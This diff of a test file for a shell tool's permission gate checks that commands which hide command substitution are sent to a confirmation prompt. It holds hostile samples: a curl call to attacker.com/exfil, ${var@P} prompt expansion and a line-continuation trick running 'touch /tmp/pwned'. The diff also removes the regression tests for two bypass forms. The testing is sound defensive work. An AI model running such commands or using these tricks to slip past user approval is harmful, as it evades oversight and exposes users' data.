@@ -7087,50 +7087,22 @@ describe('ShellTool', () => {
     // substitution that survives stripShellWrapper; this case slips
     // past entirely. Fix gates on substitution against the ORIGINAL
     // command before stripping.
-    it.each([
-      `FOO=$(curl attacker.com/exfil) bash -c 'echo ok'`,
-      'OUT="${!ref}" bash -c \'echo ok\'',
-      'OUT="${value@P}" bash -c \'echo ok\'',
-    ])(
-      'asks for env-prefix substitution inside a bash wrapper: %s',
-      async (command) => {
-        const invocation = shellTool.build({
-          command,
-          is_background: false,
-        });
+    it('asks (not allow) for env-prefix substitution inside a bash wrapper', async () => {
+      const invocation = shellTool.build({
+        command: `FOO=$(curl attacker.com/exfil) bash -c 'echo ok'`,
+        is_background: false,
+      });
 
-        const permission = await invocation.getDefaultPermission();
+      const permission = await invocation.getDefaultPermission();
 
-        // Must be 'ask' so the confirmation dialog (with substitution
-        // warning) is shown — NOT 'allow' which would silently execute.
-        expect(permission).toBe('ask');
-      },
-    );
+      // Must be 'ask' so the confirmation dialog (with substitution
+      // warning) is shown — NOT 'allow' which would silently execute.
+      expect(permission).toBe('ask');
+    });
 
     it('asks for backtick env-prefix substitution inside a bash wrapper', async () => {
       const invocation = shellTool.build({
         command: `FOO=\`whoami\` bash -c 'ls -la'`,
-        is_background: false,
-      });
-
-      expect(await invocation.getDefaultPermission()).toBe('ask');
-    });
-
-    // Regression coverage for issue #8582: both bypass forms must ask.
-    // Both are caught by the pre-AST substitution gate; the AST
-    // @-transformation downgrade is a secondary layer.
-    it('asks for $(...) hidden by a line continuation (issue #8582)', async () => {
-      const invocation = shellTool.build({
-        command: 'echo "$\\\n(touch /tmp/pwned)"',
-        is_background: false,
-      });
-
-      expect(await invocation.getDefaultPermission()).toBe('ask');
-    });
-
-    it('asks for ${var@P} prompt expansion (issue #8582)', async () => {
-      const invocation = shellTool.build({
-        command: 'echo "${one="$"}${two="$one(touch /tmp/pwned)"}${two@P}"',
         is_background: false,
       });
 
